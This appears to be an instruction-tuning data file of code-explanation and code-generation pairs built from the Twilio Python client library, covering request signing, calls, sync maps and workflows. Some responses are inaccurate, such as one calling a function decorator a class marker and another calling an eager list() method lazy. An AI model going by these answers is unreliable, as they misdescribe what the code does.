{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef obsolete_client(func):\n\n    @functools.wraps(func)\n    def new_func(*args, **kwargs):\n        raise ObsoleteException(\n            \"{} has been removed from this version of the library. \"\n            \"Please refer to current documentation for guidance.\"\n            .format(func.__name__)\n        )\n\n    return new_func", "response": "A decorator which can be used to mark a class as obsolete. It will raise an exception if the class is\n    instantiated."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nmakes a signed HTTP request to the specified URL.", "response": "def request(self, method, url, params=None, data=None, headers=None, auth=None, timeout=None,\n                allow_redirects=False):\n        \"\"\"\n        Make a signed HTTP Request\n\n        :param str method: The HTTP method to use\n        :param str url: The URL to request\n        :param dict params: Query parameters to append to the URL\n        :param dict data: Parameters to go in the body of the HTTP request\n        :param dict headers: HTTP Headers to send with the request\n        :param tuple auth: Basic Auth arguments\n        :param float timeout: Socket/Read timeout for the request\n        :param boolean allow_redirects: Whether or not to allow redirects\n        See the requests documentation for explanation of all these parameters\n\n        :return: An http response\n        :rtype: A :class:`Response <twilio.rest.http.response.Response>` object\n        \"\"\"\n        session = self.session or Session()\n        request = Request(method.upper(), url, params=params, data=data, headers=headers, auth=auth)\n        prepared_request = session.prepare_request(request)\n\n        if 'Host' not in prepared_request.headers and 'host' not in prepared_request.headers:\n            prepared_request.headers['Host'] = self._get_host(prepared_request)\n\n        validation_payload = self._build_validation_payload(prepared_request)\n        jwt = ClientValidationJwt(self.account_sid, self.api_key_sid, self.credential_sid,\n                                  self.private_key, validation_payload)\n        prepared_request.headers['Twilio-Client-Validation'] = jwt.to_jwt()\n\n        response = session.send(\n            prepared_request,\n            allow_redirects=allow_redirects,\n            timeout=timeout,\n        )\n\n        return Response(int(response.status_code), response.text)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _build_validation_payload(self, request):\n        parsed = urlparse(request.url)\n        path = parsed.path\n        query_string = parsed.query or ''\n\n        return ValidationPayload(\n            method=request.method,\n            path=path,\n            query_string=query_string,\n            all_headers=request.headers,\n            signed_headers=ValidationClient.__SIGNED_HEADERS,\n            body=request.body or ''\n        )", "response": "Builds a ValidationPayload from the request."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nvalidate that a request to the new SSL certificate is successful.", "response": "def validate_ssl_certificate(self, client):\n        \"\"\"\n        Validate that a request to the new SSL certificate is successful\n        :return: null on success, raise TwilioRestException if the request fails\n        \"\"\"\n        response = client.request('GET', 'https://api.twilio.com:8443')\n\n        if response.status_code < 200 or response.status_code >= 300:\n            raise TwilioRestException(response.status_code, 'https://api.twilio.com:8443', 'Failed to validate SSL certificate')"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef assistants(self):\n        if self._assistants is None:\n            self._assistants = AssistantList(self)\n        return self._assistants", "response": "Access the Assistant List Twilio Domain"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef accounts(self):\n        if self._accounts is None:\n            self._accounts = AccountList(self)\n        return self._accounts", "response": "Access the AccountList Twilio Domain"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\naccess the AccountContext object", "response": "def account(self):\n        \"\"\"\n        :returns: Account provided as the authenticating account\n        :rtype: AccountContext\n        \"\"\"\n        if self._account is None:\n            self._account = AccountContext(self, self.domain.twilio.account_sid)\n        return self._account"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef create(self, to, from_, method=values.unset, fallback_url=values.unset,\n               fallback_method=values.unset, status_callback=values.unset,\n               status_callback_event=values.unset,\n               status_callback_method=values.unset, send_digits=values.unset,\n               timeout=values.unset, record=values.unset,\n               recording_channels=values.unset,\n               recording_status_callback=values.unset,\n               recording_status_callback_method=values.unset,\n               sip_auth_username=values.unset, sip_auth_password=values.unset,\n               machine_detection=values.unset,\n               machine_detection_timeout=values.unset,\n               recording_status_callback_event=values.unset, trim=values.unset,\n               caller_id=values.unset,\n               machine_detection_speech_threshold=values.unset,\n               machine_detection_speech_end_threshold=values.unset,\n               machine_detection_silence_timeout=values.unset, url=values.unset,\n               application_sid=values.unset):\n        \"\"\"\n        Create a new CallInstance\n\n        :param unicode to: Phone number, SIP address, or client identifier to call\n        :param unicode from_: Twilio number from which to originate the call\n        :param unicode method: HTTP method to use to fetch TwiML\n        :param unicode fallback_url: Fallback URL in case of error\n        :param unicode fallback_method: HTTP Method to use with fallback_url\n        :param unicode status_callback: The URL we should call to send status information to your application\n        :param unicode status_callback_event: The call progress events that we send to the `status_callback` URL.\n        :param unicode status_callback_method: HTTP Method to use with status_callback\n        :param unicode send_digits: The digits to dial after connecting to the number\n        :param unicode timeout: Number of seconds to wait for an answer\n        :param bool record: Whether or not to record the call\n        :param unicode recording_channels: The number of channels in the final recording\n        :param unicode recording_status_callback: The URL that we call when the recording is available to be accessed\n        :param unicode recording_status_callback_method: The HTTP method we should use when calling the `recording_status_callback` URL\n        :param unicode sip_auth_username: The username used to authenticate the caller making a SIP call\n        :param unicode sip_auth_password: The password required to authenticate the user account specified in `sip_auth_username`.\n        :param unicode machine_detection: Enable machine detection or end of greeting detection\n        :param unicode machine_detection_timeout: Number of seconds to wait for machine detection\n        :param unicode recording_status_callback_event: The recording status events that will trigger calls to the URL specified in `recording_status_callback`\n        :param unicode trim: Set this parameter to control trimming of silence on the recording.\n        :param unicode caller_id: The phone number, SIP address, or Client identifier that made this call. Phone numbers are in E.164 format (e.g., +16175551212). SIP addresses are formatted as `name@company.com`.\n        :param unicode machine_detection_speech_threshold: Number of milliseconds for measuring stick for the length of the speech activity\n        :param unicode machine_detection_speech_end_threshold: Number of milliseconds of silence after speech activity\n        :param unicode machine_detection_silence_timeout: Number of milliseconds of initial silence\n        :param unicode url: The absolute URL that returns TwiML for this call\n        :param unicode application_sid: The SID of the Application resource that will handle the call\n\n        :returns: Newly created CallInstance\n        :rtype: twilio.rest.api.v2010.account.call.CallInstance\n        \"\"\"\n        data = values.of({\n            'To': to,\n            'From': from_,\n            'Url': url,\n            'ApplicationSid': application_sid,\n            'Method': method,\n            'FallbackUrl': fallback_url,\n            'FallbackMethod': fallback_method,\n            'StatusCallback': status_callback,\n            'StatusCallbackEvent': serialize.map(status_callback_event, lambda e: e),\n            'StatusCallbackMethod': status_callback_method,\n            'SendDigits': send_digits,\n            'Timeout': timeout,\n            'Record': record,\n            'RecordingChannels': recording_channels,\n            'RecordingStatusCallback': recording_status_callback,\n            'RecordingStatusCallbackMethod': recording_status_callback_method,\n            'SipAuthUsername': sip_auth_username,\n            'SipAuthPassword': sip_auth_password,\n            'MachineDetection': machine_detection,\n            'MachineDetectionTimeout': machine_detection_timeout,\n            'RecordingStatusCallbackEvent': serialize.map(recording_status_callback_event, lambda e: e),\n            'Trim': trim,\n            'CallerId': caller_id,\n            'MachineDetectionSpeechThreshold': machine_detection_speech_threshold,\n            'MachineDetectionSpeechEndThreshold': machine_detection_speech_end_threshold,\n            'MachineDetectionSilenceTimeout': machine_detection_silence_timeout,\n        })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return CallInstance(self._version, payload, account_sid=self._solution['account_sid'], )", "response": "Creates a new CallInstance for the specified call."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nstreaming CallInstance records from the API as a generator", "response": "def stream(self, to=values.unset, from_=values.unset,\n               parent_call_sid=values.unset, status=values.unset,\n               start_time_before=values.unset, start_time=values.unset,\n               start_time_after=values.unset, end_time_before=values.unset,\n               end_time=values.unset, end_time_after=values.unset, limit=None,\n               page_size=None):\n        \"\"\"\n        Streams CallInstance records from the API as a generator stream.\n        This operation lazily loads records as efficiently as possible until the limit\n        is reached.\n        The results are returned as a generator, so this operation is memory efficient.\n\n        :param unicode to: Phone number or Client identifier of calls to include\n        :param unicode from_: Phone number or Client identifier to filter `from` on\n        :param unicode parent_call_sid: Parent call SID to filter on\n        :param CallInstance.Status status: The status of the resources to read\n        :param datetime start_time_before: Only include calls that started on or after this date\n        :param datetime start_time: Only include calls that started on or after this date\n        :param datetime start_time_after: Only include calls that started on or after this date\n        :param datetime end_time_before: Only include usage that occurred on or before this date\n        :param datetime end_time: Only include usage that occurred on or before this date\n        :param datetime end_time_after: Only include usage that occurred on or before this date\n        :param int limit: Upper limit for the number of records to return. stream()\n                          guarantees to never return more than limit.  Default is no limit\n        :param int page_size: Number of records to fetch per request, when not set will use\n                              the default value of 50 records.  If no page_size is defined\n                              but a limit is defined, stream() will attempt to read the\n                              limit with the most efficient page size, i.e. min(limit, 1000)\n\n        :returns: Generator that will yield up to limit results\n        :rtype: list[twilio.rest.api.v2010.account.call.CallInstance]\n        \"\"\"\n        limits = self._version.read_limits(limit, page_size)\n\n        page = self.page(\n            to=to,\n            from_=from_,\n            parent_call_sid=parent_call_sid,\n            status=status,\n            start_time_before=start_time_before,\n            start_time=start_time,\n            start_time_after=start_time_after,\n            end_time_before=end_time_before,\n            end_time=end_time,\n            end_time_after=end_time_after,\n            page_size=limits['page_size'],\n        )\n\n        return self._version.stream(page, limits['limit'], limits['page_limit'])"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef list(self, to=values.unset, from_=values.unset,\n             parent_call_sid=values.unset, status=values.unset,\n             start_time_before=values.unset, start_time=values.unset,\n             start_time_after=values.unset, end_time_before=values.unset,\n             end_time=values.unset, end_time_after=values.unset, limit=None,\n             page_size=None):\n        \"\"\"\n        Lists CallInstance records from the API as a list.\n        Unlike stream(), this operation is eager and will load `limit` records into\n        memory before returning.\n\n        :param unicode to: Phone number or Client identifier of calls to include\n        :param unicode from_: Phone number or Client identifier to filter `from` on\n        :param unicode parent_call_sid: Parent call SID to filter on\n        :param CallInstance.Status status: The status of the resources to read\n        :param datetime start_time_before: Only include calls that started on or after this date\n        :param datetime start_time: Only include calls that started on or after this date\n        :param datetime start_time_after: Only include calls that started on or after this date\n        :param datetime end_time_before: Only include usage that occurred on or before this date\n        :param datetime end_time: Only include usage that occurred on or before this date\n        :param datetime end_time_after: Only include usage that occurred on or before this date\n        :param int limit: Upper limit for the number of records to return. list() guarantees\n                          never to return more than limit.  Default is no limit\n        :param int page_size: Number of records to fetch per request, when not set will use\n                              the default value of 50 records.  If no page_size is defined\n                              but a limit is defined, list() will attempt to read the limit\n                              with the most efficient page size, i.e. min(limit, 1000)\n\n        :returns: Generator that will yield up to limit results\n        :rtype: list[twilio.rest.api.v2010.account.call.CallInstance]\n        \"\"\"\n        return list(self.stream(\n            to=to,\n            from_=from_,\n            parent_call_sid=parent_call_sid,\n            status=status,\n            start_time_before=start_time_before,\n            start_time=start_time,\n            start_time_after=start_time_after,\n            end_time_before=end_time_before,\n            end_time=end_time,\n            end_time_after=end_time_after,\n            limit=limit,\n            page_size=page_size,\n        ))", "response": "Streams CallInstance records from the API as a list. This operation lazily loads all CallInstance records from the API and returns as a generator so it is efficient."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nretrieving a single page of CallInstance records from the API. This is the only API endpoint.", "response": "def page(self, to=values.unset, from_=values.unset,\n             parent_call_sid=values.unset, status=values.unset,\n             start_time_before=values.unset, start_time=values.unset,\n             start_time_after=values.unset, end_time_before=values.unset,\n             end_time=values.unset, end_time_after=values.unset,\n             page_token=values.unset, page_number=values.unset,\n             page_size=values.unset):\n        \"\"\"\n        Retrieve a single page of CallInstance records from the API.\n        Request is executed immediately\n\n        :param unicode to: Phone number or Client identifier of calls to include\n        :param unicode from_: Phone number or Client identifier to filter `from` on\n        :param unicode parent_call_sid: Parent call SID to filter on\n        :param CallInstance.Status status: The status of the resources to read\n        :param datetime start_time_before: Only include calls that started on or after this date\n        :param datetime start_time: Only include calls that started on or after this date\n        :param datetime start_time_after: Only include calls that started on or after this date\n        :param datetime end_time_before: Only include usage that occurred on or before this date\n        :param datetime end_time: Only include usage that occurred on or before this date\n        :param datetime end_time_after: Only include usage that occurred on or before this date\n        :param str page_token: PageToken provided by the API\n        :param int page_number: Page Number, this value is simply for client state\n        :param int page_size: Number of records to return, defaults to 50\n\n        :returns: Page of CallInstance\n        :rtype: twilio.rest.api.v2010.account.call.CallPage\n        \"\"\"\n        params = values.of({\n            'To': to,\n            'From': from_,\n            'ParentCallSid': parent_call_sid,\n            'Status': status,\n            'StartTime<': serialize.iso8601_datetime(start_time_before),\n            'StartTime': serialize.iso8601_datetime(start_time),\n            'StartTime>': serialize.iso8601_datetime(start_time_after),\n            'EndTime<': serialize.iso8601_datetime(end_time_before),\n            'EndTime': serialize.iso8601_datetime(end_time),\n            'EndTime>': serialize.iso8601_datetime(end_time_after),\n            'PageToken': page_token,\n            'Page': page_number,\n            'PageSize': page_size,\n        })\n\n        response = self._version.page(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return CallPage(self._version, response, self._solution)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef feedback_summaries(self):\n        if self._feedback_summaries is None:\n            self._feedback_summaries = FeedbackSummaryList(\n                self._version,\n                account_sid=self._solution['account_sid'],\n            )\n        return self._feedback_summaries", "response": "Access the feedback_summaries\n\n        :returns: twilio.rest.api.v2010.account.call.feedback_summary.FeedbackSummaryList\n        :rtype: twilio.rest.api.v2010.account.call.feedback_summary.FeedbackSummaryList"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nconstructing a CallContext :param sid: The unique string that identifies this resource :returns: twilio.rest.api.v2010.account.call.CallContext :rtype: twilio.rest.api.v2010.account.call.CallContext", "response": "def get(self, sid):\n        \"\"\"\n        Constructs a CallContext\n\n        :param sid: The unique string that identifies this resource\n\n        :returns: twilio.rest.api.v2010.account.call.CallContext\n        :rtype: twilio.rest.api.v2010.account.call.CallContext\n        \"\"\"\n        return CallContext(self._version, account_sid=self._solution['account_sid'], sid=sid, )"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get_instance(self, payload):\n        return CallInstance(self._version, payload, account_sid=self._solution['account_sid'], )", "response": "Build an instance of CallInstance"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nupdating the CallInstance :param unicode url: The absolute URL that returns TwiML for this call :param unicode method: HTTP method to use to fetch TwiML :param CallInstance.UpdateStatus status: The new status to update the call with. :param unicode fallback_url: Fallback URL in case of error :param unicode fallback_method: HTTP Method to use with fallback_url :param unicode status_callback: The URL we should call to send status information to your application :param unicode status_callback_method: HTTP Method to use to call status_callback :returns: Updated CallInstance :rtype: twilio.rest.api.v2010.account.call.CallInstance", "response": "def update(self, url=values.unset, method=values.unset, status=values.unset,\n               fallback_url=values.unset, fallback_method=values.unset,\n               status_callback=values.unset, status_callback_method=values.unset):\n        \"\"\"\n        Update the CallInstance\n\n        :param unicode url: The absolute URL that returns TwiML for this call\n        :param unicode method: HTTP method to use to fetch TwiML\n        :param CallInstance.UpdateStatus status: The new status to update the call with.\n        :param unicode fallback_url: Fallback URL in case of error\n        :param unicode fallback_method: HTTP Method to use with fallback_url\n        :param unicode status_callback: The URL we should call to send status information to your application\n        :param unicode status_callback_method: HTTP Method to use to call status_callback\n\n        :returns: Updated CallInstance\n        :rtype: twilio.rest.api.v2010.account.call.CallInstance\n        \"\"\"\n        data = values.of({\n            'Url': url,\n            'Method': method,\n            'Status': status,\n            'FallbackUrl': fallback_url,\n            'FallbackMethod': fallback_method,\n            'StatusCallback': status_callback,\n            'StatusCallbackMethod': status_callback_method,\n        })\n\n        payload = self._version.update(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return CallInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n            sid=self._solution['sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef feedback(self):\n        if self._feedback is None:\n            self._feedback = FeedbackList(\n                self._version,\n                account_sid=self._solution['account_sid'],\n                call_sid=self._solution['sid'],\n            )\n        return self._feedback", "response": "Access the feedback\n\n        :returns: twilio.rest.api.v2010.account.call.feedback.FeedbackList\n        :rtype: twilio.rest.api.v2010.account.call.feedback.FeedbackList"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ngenerating an instance context for the resource we are interested in", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: CallContext for this CallInstance\n        :rtype: twilio.rest.api.v2010.account.call.CallContext\n        \"\"\"\n        if self._context is None:\n            self._context = CallContext(\n                self._version,\n                account_sid=self._solution['account_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nupdates the CallInstance with the specified parameters", "response": "def update(self, url=values.unset, method=values.unset, status=values.unset,\n               fallback_url=values.unset, fallback_method=values.unset,\n               status_callback=values.unset, status_callback_method=values.unset):\n        \"\"\"\n        Update the CallInstance\n\n        :param unicode url: The absolute URL that returns TwiML for this call\n        :param unicode method: HTTP method to use to fetch TwiML\n        :param CallInstance.UpdateStatus status: The new status to update the call with.\n        :param unicode fallback_url: Fallback URL in case of error\n        :param unicode fallback_method: HTTP Method to use with fallback_url\n        :param unicode status_callback: The URL we should call to send status information to your application\n        :param unicode status_callback_method: HTTP Method to use to call status_callback\n\n        :returns: Updated CallInstance\n        :rtype: twilio.rest.api.v2010.account.call.CallInstance\n        \"\"\"\n        return self._proxy.update(\n            url=url,\n            method=method,\n            status=status,\n            fallback_url=fallback_url,\n            fallback_method=fallback_method,\n            status_callback=status_callback,\n            status_callback_method=status_callback_method,\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ncreating a new AssetVersionInstance", "response": "def create(self, path, visibility):\n        \"\"\"\n        Create a new AssetVersionInstance\n\n        :param unicode path: The path\n        :param AssetVersionInstance.Visibility visibility: The visibility\n\n        :returns: Newly created AssetVersionInstance\n        :rtype: twilio.rest.serverless.v1.service.asset.asset_version.AssetVersionInstance\n        \"\"\"\n        data = values.of({'Path': path, 'Visibility': visibility, })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return AssetVersionInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            asset_sid=self._solution['asset_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nconstructs a AssetVersionContext :param sid: The sid :returns: twilio.rest.serverless.v1.service.asset.asset_version.AssetVersionContext :rtype: twilio.rest.serverless.v1.service.asset.asset_version.AssetVersionContext", "response": "def get(self, sid):\n        \"\"\"\n        Constructs a AssetVersionContext\n\n        :param sid: The sid\n\n        :returns: twilio.rest.serverless.v1.service.asset.asset_version.AssetVersionContext\n        :rtype: twilio.rest.serverless.v1.service.asset.asset_version.AssetVersionContext\n        \"\"\"\n        return AssetVersionContext(\n            self._version,\n            service_sid=self._solution['service_sid'],\n            asset_sid=self._solution['asset_sid'],\n            sid=sid,\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nbuilds an instance of AssetVersionInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of AssetVersionInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.serverless.v1.service.asset.asset_version.AssetVersionInstance\n        :rtype: twilio.rest.serverless.v1.service.asset.asset_version.AssetVersionInstance\n        \"\"\"\n        return AssetVersionInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            asset_sid=self._solution['asset_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nfetching a AssetVersionInstance :returns: Fetched AssetVersionInstance :rtype: twilio.rest.serverless.v1.service.asset.asset_version.AssetVersionInstance", "response": "def fetch(self):\n        \"\"\"\n        Fetch a AssetVersionInstance\n\n        :returns: Fetched AssetVersionInstance\n        :rtype: twilio.rest.serverless.v1.service.asset.asset_version.AssetVersionInstance\n        \"\"\"\n        params = values.of({})\n\n        payload = self._version.fetch(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return AssetVersionInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            asset_sid=self._solution['asset_sid'],\n            sid=self._solution['sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ngenerate an instance context for the asset version", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: AssetVersionContext for this AssetVersionInstance\n        :rtype: twilio.rest.serverless.v1.service.asset.asset_version.AssetVersionContext\n        \"\"\"\n        if self._context is None:\n            self._context = AssetVersionContext(\n                self._version,\n                service_sid=self._solution['service_sid'],\n                asset_sid=self._solution['asset_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef public_key(self):\n        if self._public_key is None:\n            self._public_key = PublicKeyList(self._version, )\n        return self._public_key", "response": "Access the public_key list of a resource"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\naccessing the aws :returns: twilio.rest.accounts.v1.credential.aws.AwsList :rtype: twilio.rest.accounts.v1.credential.aws.AwsList", "response": "def aws(self):\n        \"\"\"\n        Access the aws\n\n        :returns: twilio.rest.accounts.v1.credential.aws.AwsList\n        :rtype: twilio.rest.accounts.v1.credential.aws.AwsList\n        \"\"\"\n        if self._aws is None:\n            self._aws = AwsList(self._version, )\n        return self._aws"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get(self):\n        return TaskStatisticsContext(\n            self._version,\n            assistant_sid=self._solution['assistant_sid'],\n            task_sid=self._solution['task_sid'],\n        )", "response": "Constructs a TaskStatisticsContext\n\n        :returns: twilio.rest.autopilot.v1.assistant.task.task_statistics.TaskStatisticsContext\n        :rtype: twilio.rest.autopilot.v1.assistant.task.task_statistics.TaskStatisticsContext"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get_instance(self, payload):\n        return TaskStatisticsInstance(\n            self._version,\n            payload,\n            assistant_sid=self._solution['assistant_sid'],\n            task_sid=self._solution['task_sid'],\n        )", "response": "Build an instance of TaskStatisticsInstance"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _proxy(self):\n        if self._context is None:\n            self._context = TaskStatisticsContext(\n                self._version,\n                assistant_sid=self._solution['assistant_sid'],\n                task_sid=self._solution['task_sid'],\n            )\n        return self._context", "response": "Generate an instance context for the object"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get(self, sid):\n        return SyncMapContext(self._version, service_sid=self._solution['service_sid'], sid=sid, )", "response": "Constructs a SyncMapContext\n\n        :param sid: The sid\n\n        :returns: twilio.rest.sync.v1.service.sync_map.SyncMapContext\n        :rtype: twilio.rest.sync.v1.service.sync_map.SyncMapContext"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nbuild an instance of SyncMapInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of SyncMapInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.sync.v1.service.sync_map.SyncMapInstance\n        :rtype: twilio.rest.sync.v1.service.sync_map.SyncMapInstance\n        \"\"\"\n        return SyncMapInstance(self._version, payload, service_sid=self._solution['service_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef update(self, ttl=values.unset, collection_ttl=values.unset):\n        data = values.of({'Ttl': ttl, 'CollectionTtl': collection_ttl, })\n\n        payload = self._version.update(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return SyncMapInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            sid=self._solution['sid'],\n        )", "response": "Update the SyncMapInstance\n\n        :param unicode ttl: Alias for collection_ttl\n        :param unicode collection_ttl: New time-to-live of this Map in seconds.\n\n        :returns: Updated SyncMapInstance\n        :rtype: twilio.rest.sync.v1.service.sync_map.SyncMapInstance"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\naccesses the sync_map_items :returns: twilio.rest.sync.v1.service.sync_map.sync_map_item.SyncMapItemList :rtype: twilio.rest.sync.v1.service.sync_map.sync_map_item.SyncMapItemList", "response": "def sync_map_items(self):\n        \"\"\"\n        Access the sync_map_items\n\n        :returns: twilio.rest.sync.v1.service.sync_map.sync_map_item.SyncMapItemList\n        :rtype: twilio.rest.sync.v1.service.sync_map.sync_map_item.SyncMapItemList\n        \"\"\"\n        if self._sync_map_items is None:\n            self._sync_map_items = SyncMapItemList(\n                self._version,\n                service_sid=self._solution['service_sid'],\n                map_sid=self._solution['sid'],\n            )\n        return self._sync_map_items"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\naccessing the sync_map_permissions :returns: twilio.rest.sync.v1.service.sync_map.sync_map_permission.SyncMapPermissionList :rtype: twilio.rest.sync.v1.service.sync_map.sync_map_permission.SyncMapPermissionList", "response": "def sync_map_permissions(self):\n        \"\"\"\n        Access the sync_map_permissions\n\n        :returns: twilio.rest.sync.v1.service.sync_map.sync_map_permission.SyncMapPermissionList\n        :rtype: twilio.rest.sync.v1.service.sync_map.sync_map_permission.SyncMapPermissionList\n        \"\"\"\n        if self._sync_map_permissions is None:\n            self._sync_map_permissions = SyncMapPermissionList(\n                self._version,\n                service_sid=self._solution['service_sid'],\n                map_sid=self._solution['sid'],\n            )\n        return self._sync_map_permissions"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ngenerate an instance context for the object", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: SyncMapContext for this SyncMapInstance\n        :rtype: twilio.rest.sync.v1.service.sync_map.SyncMapContext\n        \"\"\"\n        if self._context is None:\n            self._context = SyncMapContext(\n                self._version,\n                service_sid=self._solution['service_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nupdates the SyncMapInstance with the given ttl and collection ttl.", "response": "def update(self, ttl=values.unset, collection_ttl=values.unset):\n        \"\"\"\n        Update the SyncMapInstance\n\n        :param unicode ttl: Alias for collection_ttl\n        :param unicode collection_ttl: New time-to-live of this Map in seconds.\n\n        :returns: Updated SyncMapInstance\n        :rtype: twilio.rest.sync.v1.service.sync_map.SyncMapInstance\n        \"\"\"\n        return self._proxy.update(ttl=ttl, collection_ttl=collection_ttl, )"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef create(self, outcome=values.unset):\n        data = values.of({'Outcome': outcome, })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return FeedbackInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n            message_sid=self._solution['message_sid'],\n        )", "response": "Create a new FeedbackInstance"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nbuilds an instance of FeedbackInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of FeedbackInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.api.v2010.account.message.feedback.FeedbackInstance\n        :rtype: twilio.rest.api.v2010.account.message.feedback.FeedbackInstance\n        \"\"\"\n        return FeedbackInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n            message_sid=self._solution['message_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef create(self, friendly_name, configuration,\n               assignment_callback_url=values.unset,\n               fallback_assignment_callback_url=values.unset,\n               task_reservation_timeout=values.unset):\n        \"\"\"\n        Create a new WorkflowInstance\n\n        :param unicode friendly_name: A string representing a human readable name for this Workflow.\n        :param unicode configuration: JSON document configuring the rules for this Workflow.\n        :param unicode assignment_callback_url: A valid URL for the application that will process task assignment events.\n        :param unicode fallback_assignment_callback_url: If the request to the AssignmentCallbackUrl fails, the assignment callback will be made to this URL.\n        :param unicode task_reservation_timeout: An integer value controlling how long in seconds TaskRouter will wait for a confirmation response from your application after assigning a Task to a worker.\n\n        :returns: Newly created WorkflowInstance\n        :rtype: twilio.rest.taskrouter.v1.workspace.workflow.WorkflowInstance\n        \"\"\"\n        data = values.of({\n            'FriendlyName': friendly_name,\n            'Configuration': configuration,\n            'AssignmentCallbackUrl': assignment_callback_url,\n            'FallbackAssignmentCallbackUrl': fallback_assignment_callback_url,\n            'TaskReservationTimeout': task_reservation_timeout,\n        })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return WorkflowInstance(self._version, payload, workspace_sid=self._solution['workspace_sid'], )", "response": "Create a new WorkflowInstance"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef get(self, sid):\n        return WorkflowContext(self._version, workspace_sid=self._solution['workspace_sid'], sid=sid, )", "response": "Constructs a WorkflowContext\n\n        :param sid: The sid\n\n        :returns: twilio.rest.taskrouter.v1.workspace.workflow.WorkflowContext\n        :rtype: twilio.rest.taskrouter.v1.workspace.workflow.WorkflowContext"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get_instance(self, payload):\n        return WorkflowInstance(self._version, payload, workspace_sid=self._solution['workspace_sid'], )", "response": "Build an instance of WorkflowInstance"}
